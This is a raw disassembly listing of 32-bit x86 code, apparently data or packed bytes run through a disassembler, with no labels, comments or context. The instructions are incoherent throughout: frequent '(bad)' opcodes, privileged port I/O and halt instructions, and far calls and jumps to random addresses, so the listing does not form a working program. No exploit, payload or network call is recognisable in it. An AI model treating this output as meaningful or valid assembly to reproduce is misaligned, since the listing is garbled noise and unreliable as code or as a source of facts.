  41e5e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5eb:	cld    
  41e5ec:	fist   DWORD PTR [edi-0xd2511a7]
  41e5f2:	je     0x41e5d9
  41e5f4:	ins    DWORD PTR es:[edi],dx
  41e5f5:	mov    ecx,0x1af0fd60
  41e5fa:	push   0xe
  41e5fc:	inc    esp
  41e5fd:	cli    
  41e5fe:	jecxz  0x41e5b1
  41e600:	lods   eax,DWORD PTR ds:[esi]
  41e601:	sub    al,0x76
  41e603:	push   ss
  41e604:	data16 sbb al,0xf8
  41e607:	dec    ebp
  41e608:	or     bl,BYTE PTR [eax+0x7d5d9ed2]
  41e60e:	dec    esp
  41e60f:	pop    ecx
  41e610:	(bad)  
  41e611:	js     0x41e637
  41e613:	gs jnp 0x41e61a
  41e616:	or     ch,BYTE PTR [esi]
  41e618:	and    BYTE PTR [edx-0x7f],bh
  41e61b:	stos   BYTE PTR es:[edi],al
  41e61c:	cdq    
  41e61d:	ds (bad) 
  41e61f:	test   eax,0xf5027282
  41e624:	and    eax,0x276cf49c
  41e629:	(bad)  
  41e62b:	pop    ds
  41e62c:	in     al,dx
  41e62d:	and    eax,0x40f4901c
  41e632:	adc    bh,dh
  41e634:	outs   dx,DWORD PTR ds:[esi]
  41e635:	sub    BYTE PTR [eax-0x41],ah
  41e638:	call   0x3ba:0x4eea7d43
  41e63f:	call   0x7ee1:0x67202815
  41e646:	ror    BYTE PTR [eax+0x22],cl
  41e649:	shl    BYTE PTR ds:0x452a819c,cl
  41e64f:	adc    esp,DWORD PTR [edx+esi*4-0x55]
  41e653:	adc    bh,ah
  41e655:	sti    
  41e656:	push   ecx
  41e657:	sbb    BYTE PTR [ecx],bl
  41e659:	mov    DWORD PTR [ecx+0x5c],eax
  41e65c:	enter  0xa103,0x6e
  41e660:	in     al,dx
  41e661:	dec    edi
  41e662:	outs   dx,DWORD PTR cs:[esi]
  41e664:	outs   dx,WORD PTR ds:[esi]
  41e666:	fdiv   st(3),st
  41e668:	mov    ss,edi
  41e66a:	mov    edi,0xa29c0f60
  41e66f:	and    eax,0x7fb51f46
  41e674:	test   al,0xf1
  41e676:	clc    
  41e677:	call   0x52f63ba8
  41e67c:	push   ebx
  41e67d:	and    al,0xa
  41e680:	pop    esp
  41e681:	stos   DWORD PTR es:[di],eax
  41e683:	or     BYTE PTR [esi-0xa],0x9c
  41e687:	push   esi
  41e688:	dec    ebx
  41e689:	frstor [ebp+0x5cb15c99]
  41e68f:	adc    bl,BYTE PTR ss:[edx-0x22]
  41e693:	sahf   
  41e694:	aas    
  41e695:	mov    ebp,0xd57763c0
  41e69a:	ror    BYTE PTR [edi+0x17a272b2],0xb7
  41e6a1:	mov    cl,0x9c
  41e6a3:	aaa    
  41e6a4:	add    ah,0xec
  41e6a7:	and    edi,eax
  41e6a9:	je     0x41e6bd
  41e6ab:	scas   al,BYTE PTR es:[edi]
  41e6ac:	daa    
  41e6ad:	inc    ecx
  41e6ae:	dec    eax
  41e6af:	fwait
  41e6b0:	mov    ch,0x25
  41e6b2:	mov    cl,0x44
  41e6b4:	in     al,dx
  41e6b5:	xrelease mov BYTE PTR [ecx-0x6d412ac6],dl
  41e6bc:	push   esp
  41e6bd:	mov    ebx,0x1e660aac
  41e6c2:	shr    DWORD PTR [ecx+edx*4+0x515711e0],0xc0
  41e6ca:	sahf   
  41e6cb:	pop    es
  41e6cc:	push   ss
  41e6cd:	in     al,dx
  41e6ce:	aad    0xa9
  41e6d0:	cmp    dh,BYTE PTR [eax]
  41e6d2:	out    0xe1,eax
  41e6d4:	call   0x875235d5
  41e6d9:	retf   
  41e6da:	(bad)  
  41e6db:	cld    
  41e6dc:	jo     0x41e6b8
  41e6de:	push   ss
  41e6df:	inc    edi
  41e6e0:	cmp    ah,BYTE PTR [ebp-0x35]
  41e6e3:	rcr    BYTE PTR es:[edx+ecx*4+0x0],1
  41e6e8:	(bad)  
  41e6e9:	mov    esi,DWORD PTR [esi+0x27]
  41e6ec:	jmp    0x1facd968
  41e6f1:	daa    
  41e6f2:	test   DWORD PTR [eax],esi
  41e6f4:	ja     0x41e67e
  41e6f6:	out    dx,eax
  41e6f7:	sub    DWORD PTR ds:0xd6ebe3ea,esp
  41e6fd:	test   BYTE PTR [esi],0xad
  41e700:	and    ecx,DWORD PTR [esp+edx*1]
  41e703:	push   ds
  41e704:	dec    ecx
  41e705:	mov    eax,ds:0x88e27eb0
  41e70a:	mov    al,0xed
  41e70c:	mov    ebp,fs
  41e70e:	push   ds
  41e70f:	xor    eax,0xbdba0b45
  41e714:	stos   BYTE PTR es:[edi],al
  41e715:	bound  ebx,QWORD PTR [esi]
  41e717:	stos   BYTE PTR es:[edi],al
  41e718:	xchg   ebp,ecx
  41e71a:	repnz inc ebp
  41e71c:	jno    0x41e737
  41e71e:	ds jmp 0x41e79d
  41e721:	cmp    DWORD PTR [ecx-0x51],ebp
  41e724:	shr    DWORD PTR [edi-0x277d44e5],0x77
  41e72b:	(bad)  [esi-0x1d]
  41e72e:	call   DWORD PTR [ebp+0x7eeea44e]
  41e734:	popf   
  41e735:	es or  edx,esi
  41e738:	or     BYTE PTR [edi+ecx*1-0x60],cl
  41e73c:	sub    bl,bh
  41e73e:	rcl    bh,cl
  41e740:	sti    
  41e741:	and    al,BYTE PTR [esi+0x67]
  41e744:	push   es
  41e745:	nop
  41e746:	fnstcw WORD PTR [esi+0x4f]
  41e749:	(bad)  
  41e74a:	aaa    
  41e74b:	jp     0x41e7be
  41e74d:	aad    0xd9
  41e74f:	cmp    eax,0xb2a6294a
  41e754:	test   BYTE PTR [esi+0x6f],dl
  41e757:	dec    ecx
  41e758:	and    cl,ch
  41e75a:	push   0xa8cfa612
  41e75f:	cmp    DWORD PTR [ebp+edi*4+0x150e7376],ebx
  41e766:	push   eax
  41e767:	call   0xf89:0xca085628
  41e76e:	iret   
  41e76f:	jo     0x41e7bb
  41e771:	cmp    eax,0x122f7c49
  41e776:	add    esi,DWORD PTR [esi-0x6e]
  41e779:	(bad)  [ecx+0x40bce934]
  41e77f:	xor    DWORD PTR [edi+0xc],eax
  41e782:	adc    BYTE PTR [edi],ah
  41e784:	mov    cl,0xa1
  41e786:	jl     0x41e76e
  41e788:	sub    DWORD PTR [edi-0x3b],ebx
  41e78b:	aas    
  41e78c:	inc    edi
  41e78d:	xor    bh,ah
  41e78f:	pop    esi
  41e790:	(bad)  
  41e791:	mov    ebp,0x15c1aab7
  41e796:	jle    0x41e719
  41e798:	(bad)  [eax+0x34769a78]
  41e79e:	and    DWORD PTR [ebx+0x537ab916],ecx
  41e7a4:	and    eax,0x1959409
  41e7a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7aa:	sti    
  41e7ab:	jns    0x41e828
  41e7ad:	shl    BYTE PTR [edx-0x2858f253],0x2e
  41e7b4:	adc    ecx,ebx
  41e7b6:	mov    ecx,0xa89c36b1
  41e7bb:	sub    esp,DWORD PTR [ecx+0x4456cad5]
  41e7c1:	fbstp  TBYTE PTR [esi+0x49]
  41e7c4:	call   0xaa55:0x9064df9e
  41e7cb:	or     al,0x4a
  41e7cd:	xor    DWORD PTR [ebp-0x638a0364],edx
  41e7d3:	mov    esi,0x7cf56605
  41e7d8:	jp     0x41e7e5
  41e7da:	or     edi,DWORD PTR [ecx-0x31480ba7]
  41e7e0:	adc    al,0xf4
  41e7e2:	adc    DWORD PTR [eax+0x5c522e27],0x55
  41e7e9:	or     edx,DWORD PTR [edi]
  41e7eb:	in     al,0xa0
  41e7ed:	push   edi
  41e7ee:	cwde   
  41e7ef:	and    esi,edx
  41e7f1:	jecxz  0x41e7ac
  41e7f3:	cld    
  41e7f4:	dec    edi
  41e7f5:	std    
  41e7f6:	and    bl,BYTE PTR [ecx+0x7ecc3d7b]
  41e7fc:	mov    ecx,DWORD PTR [eax+0x1ecca8e6]
  41e802:	jnp    0x41e7f2
  41e804:	add    DWORD PTR [ebp-0x6e],edx
  41e807:	sub    DWORD PTR [ecx+0x14539c2f],edi
  41e80d:	dec    esp
  41e80e:	dec    edi
  41e80f:	inc    ebx
  41e810:	pop    esp
  41e811:	(bad)  
  41e812:	mov    WORD PTR [edx+0x57674341],es
  41e818:	into   
  41e819:	es xchg ebp,eax
  41e81b:	push   0x7e
  41e81d:	loopne 0x41e81d
  41e81f:	dec    ebx
  41e820:	push   ecx
  41e821:	call   0x96f4:0xc54d88ae
  41e828:	(bad)  
  41e829:	cmp    eax,0xbe01ec85
  41e82e:	xor    BYTE PTR [ecx],ch
  41e830:	retf   0xfb4c
  41e833:	out    dx,al
  41e834:	xchg   al,dh
  41e836:	push   ecx
  41e837:	(bad)  
  41e838:	pusha  
  41e839:	test   eax,0x41f4c072
  41e83e:	sti    
  41e83f:	sbb    cl,al
  41e841:	dec    esi
  41e842:	push   ds
  41e843:	les    edi,FWORD PTR [ecx+0x2e412420]
  41e849:	adc    al,0xaa
  41e84b:	jnp    0x41e817
  41e84d:	sahf   
  41e84e:	mov    al,0x9e
  41e850:	fild   DWORD PTR [edx-0x8e30f7]
  41e856:	cwde   
  41e857:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41e859:	cmp    al,0x17
  41e85b:	sti    
  41e85c:	xchg   esi,eax
  41e85d:	xor    BYTE PTR [ecx-0x68],cl
  41e860:	inc    ebp
  41e861:	int3   
  41e862:	xor    al,0x9b
  41e864:	iret   
  41e865:	or     DWORD PTR [ebx+0x15],ebx
  41e868:	pop    ebp
  41e869:	jnp    0x41e8e5
  41e86b:	push   es
  41e86c:	fst    DWORD PTR [edi-0x1b2562c1]
  41e872:	or     ebp,ecx
  41e874:	mov    cl,0xbe
  41e876:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e877:	mov    gs,WORD PTR [eax]
  41e879:	xor    ebx,esp
  41e87b:	adc    DWORD PTR [ebx-0x2f1ff124],edi
  41e881:	in     al,0x86
  41e883:	cmp    ecx,ecx
  41e885:	xor    ebp,DWORD PTR [edx+0x4b68f9da]
  41e88b:	pop    ebx
  41e88c:	dec    ebx
  41e88d:	fstp   DWORD PTR [ecx+0x13]
  41e890:	in     eax,0xd3
  41e892:	out    dx,al
  41e893:	jb     0x41e886
  41e895:	mov    bh,BYTE PTR [edx+edx*2+0x5d]
  41e899:	adc    dl,BYTE PTR [eax-0x54]
  41e89c:	adc    bl,ch
  41e89e:	cmp    DWORD PTR [esi-0x220cc144],edx
  41e8a4:	fldcw  WORD PTR [eax+esi*2-0x3b]
  41e8a8:	sub    al,0x48
  41e8aa:	fwait
  41e8ab:	fs and ch,al
  41e8ae:	mov    esi,0x3a0f4645
  41e8b3:	js     0x41e90f
  41e8b5:	jl     0x41e8ac
  41e8b7:	mov    BYTE PTR [ebx+eiz*8],0xc
  41e8bb:	nop
  41e8bc:	mov    esi,0x732534d0
  41e8c1:	cmp    eax,0xc6a1a91c
  41e8c6:	dec    DWORD PTR [edi+0x18ea825]
  41e8cc:	push   ss
  41e8cd:	adc    DWORD PTR [eax+0x396dba2a],esi
  41e8d3:	mov    bl,0x27
  41e8d5:	pusha  
  41e8d6:	cmp    BYTE PTR [ecx+0x51],al
  41e8d9:	cdq    
  41e8da:	mov    dl,0x14
  41e8dc:	xchg   ebx,eax
  41e8dd:	out    dx,eax
  41e8de:	jns    0x41e942
  41e8e0:	sar    eax,1
  41e8e2:	dec    esp
  41e8e3:	push   es
  41e8e4:	add    dl,cl
  41e8e6:	jg     0x41e939
  41e8e8:	ins    DWORD PTR es:[edi],dx
  41e8e9:	add    al,BYTE PTR [edi+ebx*2]
  41e8ec:	inc    esi
  41e8ed:	cmp    BYTE PTR [ebp+0x155046e3],cl
  41e8f3:	mov    cl,0x85
  41e8f5:	sbb    al,0x1c
  41e8f7:	xor    BYTE PTR [edi-0x7d3e53f9],al
  41e8fd:	arpl   bx,ax
  41e8ff:	retf   0x77ac
  41e902:	inc    eax
  41e903:	cmp    BYTE PTR [ecx+0x41],ah
  41e906:	mov    edi,0x8b87d7dd
  41e90b:	mul    esp
  41e90d:	aaa    
  41e90e:	mov    cl,0x10
  41e910:	std    
  41e911:	in     eax,dx
  41e912:	and    eax,0xa5f11bd4
  41e917:	and    ebp,esp
  41e919:	gs jb  0x41e8b6
  41e91c:	in     al,0x4d
  41e91e:	xor    dh,BYTE PTR [ecx+0x6b0b9ad6]
  41e924:	lahf   
  41e925:	xchg   BYTE PTR [edi-0x72],bl
  41e928:	inc    esi
  41e929:	(bad)  
  41e92a:	mov    edx,0x56ee0e65
  41e92f:	outs   dx,BYTE PTR ds:[esi]
  41e930:	lahf   
  41e931:	ror    esp,1
  41e933:	or     al,0xeb
  41e935:	mov    DWORD PTR [esi+0x52a65f8a],edx
  41e93b:	sub    al,0x65
  41e93d:	and    DWORD PTR [eax+0x4efcc97d],ebp
  41e943:	pop    eax
  41e944:	into   
  41e945:	jg     0x41e97d
  41e947:	mov    eax,ds:0xfd1cfce7
  41e94c:	(bad)  
  41e94d:	loopne 0x41e957
  41e94f:	mov    bl,cl
  41e951:	in     eax,0xea
  41e953:	cld    
  41e954:	push   ss
  41e955:	mov    ebx,0xa6541b40
  41e95a:	hlt    
  41e95b:	add    ch,dh
  41e95d:	and    BYTE PTR [edx],dh
  41e95f:	xchg   DWORD PTR [ebp+0x2ebff15a],ebx
  41e965:	mov    dh,0x9c
  41e967:	push   eax
  41e968:	push   esp
  41e969:	popf   
  41e96a:	sbb    al,0x6e
  41e96c:	pop    ebx
  41e96d:	in     eax,0x20
  41e96f:	dec    ebp
  41e970:	ret    
  41e971:	xchg   BYTE PTR [edi+0x67ddcbb4],bh
  41e977:	fcmovb st,st(5)
  41e979:	lea    edi,[ecx+0x15be5402]
  41e97f:	pusha  
  41e980:	mov    ebx,?
  41e982:	aas    
  41e983:	jmp    0x41e924
  41e985:	xchg   DWORD PTR [ecx+edi*4-0x7fa6efc0],ebp
  41e98c:	jl     0x41e91f
  41e98e:	les    ecx,FWORD PTR [edi+0x3fa0be00]
  41e994:	call   DWORD PTR [ebp-0x2a547170]
  41e99a:	adc    DWORD PTR [edi+0x6f21efdd],ebx
  41e9a0:	jno    0x41e9e4
  41e9a2:	sahf   
  41e9a3:	fisttp QWORD PTR [edi-0x5aa41a8e]
  41e9a9:	mov    eax,0x87746d79
  41e9ae:	cld    
  41e9af:	pop    ebx
  41e9b0:	pusha  
  41e9b1:	push   esi
  41e9b2:	(bad)  
  41e9b3:	xchg   ebx,eax
  41e9b4:	add    ebx,ecx
  41e9b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9b7:	in     al,dx
  41e9b8:	pop    edi
  41e9b9:	(bad)  
  41e9ba:	cmp    dh,BYTE PTR [ecx+0x47]
  41e9bd:	pop    ss
  41e9be:	push   ecx
  41e9bf:	sar    DWORD PTR [edx+0x34],cl
  41e9c2:	or     eax,0xea201b2
  41e9c7:	xlat   BYTE PTR ds:[ebx]
  41e9c8:	test   al,0x1
  41e9ca:	test   edi,0xf4b1ed11
  41e9d0:	pop    edi
  41e9d1:	(bad)  
  41e9d2:	repz mov dl,0x6a
  41e9d5:	add    eax,0x4ffcb89c
  41e9da:	pop    ebp
  41e9db:	jmp    0x1e613264
  41e9e0:	inc    esp
  41e9e1:	stos   BYTE PTR es:[edi],al
  41e9e2:	outs   dx,DWORD PTR ds:[esi]
  41e9e3:	adc    al,0x40
  41e9e5:	sub    eax,0x856689c1
  41e9ea:	and    eax,0xeb90ea53
  41e9ef:	mov    ds:0x9be38b8b,al
  41e9f4:	mov    eax,ds:0x5cbcbc3
  41e9f9:	sbb    ch,BYTE PTR [edi]
  41e9fb:	cli    
  41e9fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9fd:	int3   
  41e9fe:	outs   dx,DWORD PTR ds:[esi]
  41e9ff:	xor    al,BYTE PTR [ebx]
  41ea01:	xor    ecx,ecx
  41ea03:	push   ebx
  41ea04:	dec    ebp
  41ea05:	xchg   esi,ebx
  41ea07:	lahf   
  41ea08:	pop    es
  41ea09:	ds jmp 0x41e9ed
  41ea0c:	out    0x9,eax
  41ea0e:	push   ss
  41ea0f:	loop   0x41ea4f
  41ea11:	jmp    0x8bdf:0x5252cb46
  41ea18:	shr    DWORD PTR [esi],1
  41ea1a:	or     al,0x98
  41ea1c:	jecxz  0x41e9cb
  41ea1e:	aas    
  41ea1f:	jns    0x41ea72
  41ea21:	push   esp
  41ea22:	(bad)  
  41ea23:	jmp    0x41eaa4
  41ea25:	(bad)  
  41ea26:	repz xor DWORD PTR [edx+ebp*4],eax
  41ea2a:	std    
  41ea2b:	in     eax,0x96
  41ea2d:	sahf   
  41ea2e:	and    BYTE PTR [ecx+ebp*4+0x2a47361d],al
  41ea35:	scas   eax,DWORD PTR es:[edi]
  41ea36:	dec    ebx
  41ea37:	dec    edi
  41ea38:	dec    ebp
  41ea39:	push   ecx
  41ea3a:	(bad)  
  41ea3b:	jo     0x41ea1a
  41ea3d:	pusha  
  41ea3e:	inc    esp
  41ea3f:	outs   dx,DWORD PTR ds:[esi]
  41ea40:	iret   
  41ea41:	lahf   
  41ea42:	adc    al,cl
  41ea44:	std    
  41ea45:	scas   al,BYTE PTR es:[edi]
  41ea46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea47:	fist   WORD PTR [ebx+0x37117bd9]
  41ea4d:	rcr    DWORD PTR [esi+0x6d],1
  41ea50:	dec    esp
  41ea51:	aad    0x4e
  41ea53:	dec    ebx
  41ea54:	das    
  41ea55:	jne    0x41e9fa
  41ea57:	and    al,0x27
  41ea59:	pop    ds
  41ea5a:	or     BYTE PTR [eax],ah
  41ea5c:	stos   BYTE PTR es:[edi],al
  41ea5d:	dec    edx
  41ea5e:	xor    DWORD PTR ds:0xc9a71f20,ebp
  41ea64:	rcl    DWORD PTR [eax],1
  41ea66:	cwde   
  41ea67:	fsubrp st(1),st
  41ea69:	test   al,0x26
  41ea6b:	pop    eax
  41ea6c:	fwait
  41ea6d:	test   eax,0x2a0d33cf
  41ea72:	ins    DWORD PTR es:[edi],dx
  41ea73:	out    dx,al
  41ea74:	pand   mm4,QWORD PTR [edx-0x4f]
  41ea78:	push   ds
  41ea79:	pop    ss
  41ea7a:	fdivr  st(0),st
  41ea7c:	ss sub al,0xf
  41ea7f:	out    0x89,al
  41ea81:	dec    esi
  41ea82:	add    cl,BYTE PTR [esi-0x3aed2b06]
  41ea88:	cld    
  41ea89:	inc    ebp
  41ea8a:	inc    ebp
  41ea8b:	aam    0x7
  41ea8d:	xor    al,ah
  41ea8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea90:	or     ebp,DWORD PTR [eax-0x2b]
  41ea93:	dec    eax
  41ea94:	cwde   
  41ea95:	out    dx,eax
  41ea96:	out    dx,eax
  41ea97:	les    ecx,FWORD PTR [ebx-0x2f]
  41ea9a:	es jmp 0x41eb14
  41ea9d:	scas   al,BYTE PTR es:[edi]
  41ea9e:	ds xor edx,ebp
  41eaa1:	or     al,0xed
  41eaa3:	popa   
  41eaa4:	shl    BYTE PTR [esi+eax*4-0x78010a51],1
  41eaab:	lods   al,BYTE PTR ds:[esi]
  41eaac:	repz jg 0x41eb0f
  41eaaf:	call   0xdbaa8be2
  41eab4:	jp     0x41ea3e
  41eab6:	int    0x31
  41eab8:	fcom   st(6)
  41eaba:	aad    0x8e
  41eabc:	mov    bl,BYTE PTR [esi+0x55c2542b]
  41eac2:	mov    ch,0xdc
  41eac4:	arpl   WORD PTR [ebp+0x20],bp
  41eac7:	or     bl,dh
  41eac9:	mov    eax,ds:0xace082f
  41eace:	test   eax,0x9ac7e22e
  41ead3:	cmp    ah,BYTE PTR [esi-0x62]
  41ead6:	add    DWORD PTR [ebx-0x3794033e],eax
  41eadc:	shl    BYTE PTR [edx],cl
  41eade:	inc    ebp
  41eadf:	pop    ds
  41eae0:	aad    0xda
  41eae2:	jnp    0x41eac2
  41eae4:	push   0xffffffb2
  41eae6:	sbb    bh,BYTE PTR [ecx]
  41eae8:	cmp    ebp,ecx
  41eaea:	inc    ecx
  41eaeb:	add    DWORD PTR [ecx+0x2],0x323fc384
  41eaf2:	clts   
  41eaf4:	mov    ch,0x2d
  41eaf6:	pop    eax
  41eaf7:	or     DWORD PTR fs:[edx-0x5ed9a0a3],ebp
  41eafe:	or     al,0xf7
  41eb00:	ss push esi
  41eb02:	bnd jnp 0x41eb47
  41eb05:	rol    edx,cl
  41eb07:	(bad)  
  41eb08:	aaa    
  41eb09:	stos   BYTE PTR es:[edi],al
  41eb0a:	mov    BYTE PTR [eax],dh
  41eb0c:	push   ecx
  41eb0d:	lods   eax,DWORD PTR ds:[esi]
  41eb0e:	test   eax,0xbfe09e86
  41eb13:	sti    
  41eb14:	hlt    
  41eb15:	adc    ecx,edx
  41eb17:	mov    bl,0x50
  41eb19:	ins    BYTE PTR es:[edi],dx
  41eb1a:	fldenv [edi]
  41eb1c:	push   es
  41eb1d:	push   esp
  41eb1e:	jb     0x41eb49
  41eb20:	dec    eax
  41eb21:	sbb    al,0xee
  41eb23:	shl    BYTE PTR [ebx+0x183c5491],cl
  41eb29:	shl    ebx,cl
  41eb2b:	out    dx,eax
  41eb2c:	sub    al,0x93
  41eb2f:	into   
  41eb30:	fisttp DWORD PTR [eax-0x49]
  41eb33:	adc    DWORD PTR [edi],esi
  41eb35:	aaa    
  41eb36:	jp     0x41eac4
  41eb38:	mov    esp,0x1999e011
  41eb3d:	push   ebp
  41eb3e:	fstp   QWORD PTR [esi-0x34]
  41eb41:	cmp    ch,BYTE PTR [ebx+eax*8+0x5]
  41eb45:	fstp   TBYTE PTR [ecx-0x26f8e4fe]
  41eb4b:	push   cs
  41eb4c:	std    
  41eb4d:	imul   esp
  41eb4f:	pop    edx
  41eb50:	cwde   
  41eb51:	mov    ds:0x8fc5b086,eax
  41eb56:	mov    ebp,0x8596a350
  41eb5b:	add    BYTE PTR ds:0xb6b66c16,0x30
  41eb62:	(bad)  
  41eb63:	hlt    
  41eb64:	xor    al,0x98
  41eb66:	iret   
  41eb67:	out    dx,eax
  41eb68:	jnp    0x41eb73
  41eb6a:	add    edx,DWORD PTR [edx+ebp*8+0x7b4ac60a]
  41eb71:	sub    esi,ebp
  41eb73:	test   eax,0xb055c4c1
  41eb78:	jb     0x41eb46
  41eb7a:	(bad)  
  41eb7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb7c:	(bad)  
  41eb7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb7e:	dec    eax
  41eb7f:	push   ecx
  41eb80:	mov    dh,0xf
  41eb82:	cmp    eax,0x24e16594
  41eb87:	call   0x283ca0b5
  41eb8c:	pop    eax
  41eb8d:	iret   
  41eb8e:	pop    esi
  41eb8f:	push   ds
  41eb90:	enter  0xe460,0x92
  41eb94:	and    edi,0x47
  41eb97:	pop    edi
  41eb98:	arpl   WORD PTR [edi-0xed9f6cd],sp
  41eb9e:	push   0xffffffa1
  41eba0:	adc    ebp,edx
  41eba2:	sub    edx,DWORD PTR [eax+0x13]
  41eba5:	mov    ch,0xef
  41eba7:	xchg   ebp,eax
  41eba8:	cdq    
  41eba9:	cmp    DWORD PTR [edi+0x34bf031b],ebp
  41ebaf:	mov    ebp,0x5b3c47d8
  41ebb4:	leave  
  41ebb5:	lods   al,BYTE PTR ds:[esi]
  41ebb6:	stc    
  41ebb7:	dec    eax
  41ebb8:	fidivr WORD PTR [edi+0x7dc79c93]
  41ebbe:	lahf   
  41ebbf:	inc    BYTE PTR [eax]
  41ebc1:	adc    esp,edx
  41ebc3:	inc    ecx
  41ebc4:	mov    al,ds:0xb9281e1b
  41ebc9:	push   0xffffff9e
  41ebcb:	ds jecxz 0x41eb65
  41ebce:	test   DWORD PTR ds:0x76208d93,esi
  41ebd4:	sbb    DWORD PTR [eax-0x3e],esp
  41ebd7:	repnz push 0x267a86b
  41ebdd:	sub    DWORD PTR [esi],edi
  41ebdf:	pop    ss
  41ebe0:	mov    BYTE PTR [ebx+0x49811cad],cl
  41ebe6:	mov    WORD PTR [eax],cs
  41ebe8:	leave  
  41ebe9:	adc    eax,0xe38ce950
  41ebee:	in     eax,0x6f
  41ebf0:	daa    
  41ebf1:	iret   
  41ebf2:	jmp    0x41ec33
  41ebf4:	data16 cmp cl,BYTE PTR [ebx+eax*2-0x28]
  41ebf9:	mov    esp,0x9a573d5c
  41ebfe:	or     eax,0x17e9d3e3
  41ec03:	sub    al,0x2
  41ec05:	(bad)  
  41ec06:	cmp    esp,edi
  41ec08:	jg     0x41ec11
  41ec0a:	mov    ebx,0x7fad019a
  41ec0f:	and    ecx,DWORD PTR [esi+0x43]
  41ec12:	dec    esp
  41ec13:	inc    eax
  41ec14:	xor    esp,DWORD PTR [ecx]
  41ec16:	or     al,0xc8
  41ec18:	fild   DWORD PTR [eax-0x5b]
  41ec1b:	jl     0x41ec5c
  41ec1d:	stc    
  41ec1e:	pop    es
  41ec1f:	and    eax,0xed658e99
  41ec24:	jns    0x41ebb7
  41ec26:	mov    eax,0x1d5e4d6
  41ec2b:	xor    ebp,edi
  41ec2d:	lock idiv DWORD PTR [eiz*1+0x40837d1b]
  41ec35:	push   cs
  41ec36:	lea    eax,[edx+0x7cc9a990]
  41ec3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec3d:	xor    edx,DWORD PTR [eax+0x7278ff9]
  41ec43:	dec    ecx
  41ec44:	jno    0x41ebd0
  41ec46:	sbb    ecx,DWORD PTR [ecx]
  41ec48:	jne    0x41ec4c
  41ec4a:	call   0xcebdf6dd
  41ec4f:	daa    
  41ec50:	jle    0x41ec80
  41ec52:	iret   
  41ec53:	fs push ecx
  41ec55:	push   0xb0378bd7
  41ec5a:	xchg   esi,eax
  41ec5b:	pop    ebp
  41ec5c:	push   ebp
  41ec5d:	in     al,dx
  41ec5e:	in     ax,dx
  41ec60:	mov    dh,0x50
  41ec62:	sbb    ecx,DWORD PTR [edx]
  41ec64:	sub    eax,esi
  41ec66:	mov    ds:0x2ea58198,eax
  41ec6b:	or     bh,BYTE PTR [ebp+0x59]
  41ec6e:	pop    edx
  41ec6f:	or     DWORD PTR [edi-0x58],0x79c699ae
  41ec76:	pusha  
  41ec77:	fnstcw WORD PTR [edx]
  41ec79:	adc    eax,0xd8d8541f
  41ec7e:	out    0x64,eax
  41ec80:	rol    bh,0xc6
  41ec83:	or     ah,BYTE PTR [eax]
  41ec85:	out    0xe5,al
  41ec87:	xchg   edx,eax
  41ec88:	jno    0x41ec3f
  41ec8a:	hlt    
  41ec8b:	add    DWORD PTR [eax],eax
  41ec8d:	sub    DWORD PTR [esp+edx*4-0x6b],edx
  41ec91:	mov    eax,ds:0xaeef0772
  41ec96:	ins    BYTE PTR es:[edi],dx
  41ec97:	mov    ds:0xe6f940c2,al
  41ec9c:	adc    DWORD PTR [esi-0x18991172],eax
  41eca2:	add    ebp,eax
  41eca4:	push   edx
  41eca5:	les    ecx,FWORD PTR [eax+0x230c02f4]
  41ecab:	mov    es,WORD PTR ds:0x57145573
  41ecb1:	in     eax,0x2d
  41ecb3:	loope  0x41ecc1
  41ecb5:	mov    edi,0xc20fbf43
  41ecba:	cmp    eax,0x93c8e857
  41ecbf:	xchg   ebp,eax
  41ecc0:	(bad)  
  41ecc1:	sbb    al,0xa4
  41ecc3:	loopne 0x41ecb5
  41ecc5:	retf   0x6cce
  41ecc8:	xchg   ebx,eax
  41ecc9:	jecxz  0x41ec5d
  41eccb:	shr    DWORD PTR [ebx+0x2c49f08f],cl
  41ecd1:	add    al,0xcc
  41ecd3:	mov    ebx,0xd8a8d648
  41ecd8:	mov    DWORD PTR [esi+0x6e],edi
  41ecdb:	cli    
  41ecdc:	loopne 0x41ed01
  41ecde:	push   es
  41ecdf:	stc    
  41ece0:	mov    bl,0x60
  41ece2:	dec    ebx
  41ece3:	jp     0x41ecb8
  41ece5:	inc    BYTE PTR [esi]
  41ece7:	mov    WORD PTR [ebx-0x4d],es
  41ecea:	adc    eax,0xe0e3c11c
  41ecef:	or     dl,BYTE PTR [esi]
  41ecf1:	ror    BYTE PTR [ebx],0x12
  41ecf4:	adc    ecx,DWORD PTR [ebp-0x14]
  41ecf7:	add    DWORD PTR [edi-0x24],ecx
  41ecfa:	mov    esp,0x1cb9f7ba
  41ecff:	pop    eax
  41ed00:	xor    al,0x3d
  41ed02:	pop    es
  41ed03:	iret   
  41ed04:	pop    esi
  41ed05:	jecxz  0x41ecd5
  41ed07:	jbe    0x41ecc1
  41ed09:	cmp    dh,BYTE PTR [ecx+0x11b5a16]
  41ed0f:	dec    esp
  41ed10:	das    
  41ed11:	sbb    eax,0x2da289d5
  41ed16:	inc    esi
  41ed17:	ja     0x41ec9f
  41ed19:	adc    al,0xb0
  41ed1b:	(bad)  
  41ed1c:	push   0xffffff83
  41ed1e:	jmp    0x13b1911c
  41ed23:	sar    eax,1
  41ed25:	jo     0x41ed1e
  41ed27:	xchg   esi,ecx
  41ed29:	fistp  QWORD PTR [edi+0xb7cb44e]
  41ed2f:	dec    ebp
  41ed30:	pop    es
  41ed31:	lahf   
  41ed32:	nop
  41ed33:	in     eax,0xe
  41ed35:	pop    ds
  41ed36:	mov    ecx,0x84a1a40c
  41ed3b:	sub    al,0x13
  41ed3d:	stc    
  41ed3e:	xlat   BYTE PTR ds:[ebx]
  41ed3f:	fld    QWORD PTR [edi-0x1c7314d6]
  41ed45:	adc    dh,cl
  41ed47:	clc    
  41ed48:	jg     0x41ed6b
  41ed4a:	jmp    0x41ed65
  41ed4c:	inc    esi
